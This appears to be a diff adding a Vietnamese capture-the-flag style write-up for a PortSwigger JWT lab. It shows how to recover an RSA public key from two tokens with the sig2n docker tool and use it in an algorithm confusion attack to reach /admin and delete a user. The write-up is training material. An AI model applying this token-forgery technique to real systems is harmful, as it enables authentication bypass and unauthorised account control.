@@ -75,3 +75,14 @@ Sở dĩ có thể thực hiện tấn công như vậy là vì website đã kh�
 Thay đổi path thành `/admin/delete?username=carlos`, kết quả bài lab được giải.
 
 # 8. JWT authentication bypass via algorithm confusion with no exposed key
+Đăng nhập với credentials wiener:peter, lấy hai JWT token. Để tính toán public key dựa trên 2 JWT token có được, ta sử dụng tool `jwt_forgery.py`:
+```
+sudo docker run --rm -it portswigger/sig2n eyJraWQiOiJkMzcyYTY3MS0yMzEzLTQyODQtYjVmMy1jZGEyOTUyODJlZmIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3OTk3MTUyOH0.Gbvlkt53gjSF9wZM5-mQxbb-CzNkyxRvf4QE2Uk9fLggdAUK8sWaa89gwiYo8DqSp17lI7yVh2rMbb4BMK589YeWpBkLy9qi6Cyi_tKcPCzQxkGs0LDrULxKrpVK6Yb2cqF7GJm6SVRRzRmlzi1Q6TgCYJoDy7XMkdr_tK_zoJ73ICZbyUmyw7n5ErOaVTuRyjstT_47wzsYj1XWppjc0ytxHdyleVExRvrvXqeborNRCovup0ySWUw35dSfItFbsQ4_s31zoPoo4HfWNcI4Pic7unueLkDg-co0f0MDHYDhIEkiaNy2Z9VXRzRg98RdD6kSL8GgEeIKPNKsq1ilyA eyJraWQiOiJkMzcyYTY3MS0yMzEzLTQyODQtYjVmMy1jZGEyOTUyODJlZmIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3OTk3MTUxMX0.vTiw_8pNTLvZqXO9I090HvfSA-iTjPyLQnKd7FFAFOioDtnYhhuFFCyyfgY6g7w-tJZPHkSy4M4M7oOnhPdkbF7cRAhytaY-ppkfe2dh2fSI_a3_7kc3J1ExwM8Tp7ep2twgPtjbkhLsx_e3uEfv5XKE3vqAnyjRkaJm-Bdly9cgdnxPpjAKv4xcgGpGS2ElRoedGufZB8iVf8o9fHkI_MaH6IOFcVGsMSO9h2e8rsghAHhus0FNrsDH2nNNs-EpLSNkuinhOJPf3NykF02T2h3FaP39GS5orpOZlIDtniivORTpPgqV5TWrhXvTrsB_tdittDA-_04qF9Upaa40-A
+```
+Sau khi chương trình chạy xong, ta thu được public key với format x509 đã được base64 encode:
+```
+LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEwenZZbkRNaTJEL2lBczI5eFpnWAo5Mnd4Y0pWT01YUU1zZVNXd0V2QnUrRUMybGFOcEJOVmF1YUdUdi9GanMxRmJhbUtLNjB5c0lnaVFGZGFRYkIrCk40TncrWkwvaloxOWVxWTVXWmZWaDRNdDR4MDUzUG5UMjRvMUhXMVVmNjlaUThaNEZSSDBOWGlUZXAySmhhclQKKzdYUi82OXduUWRYZXdkQXgzM0dRQzdCZDlVUENxRFBDYXZva3dVeldLY1ZCbUxzNks4M1BJZEJ6azhwdTRPQwpJRk1IZS91RkNIaHpUVlVWa2FXVEFKTWl2aHBtTmxiUEVNajJEdnpGRmlSMC9YcUNibXFGMXF3UHdyemlYTEpVClJlNWY4dWw3Q04vZzQzem5zZml5L2k2YUcxVTdtRFBEMEpQQ0tBVUw5bjBnL1l2OXEyZlVlYlI1ejRFUlByN3YKK3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+```
+Sử dụng public key thu được bên trên để tấn công algorithm confusion như bài lab 7, kết quả ta access `/admin` thành công.
+
+Thay đổi path thành `/admin/delete?username=carlos`, bài lab được giải.
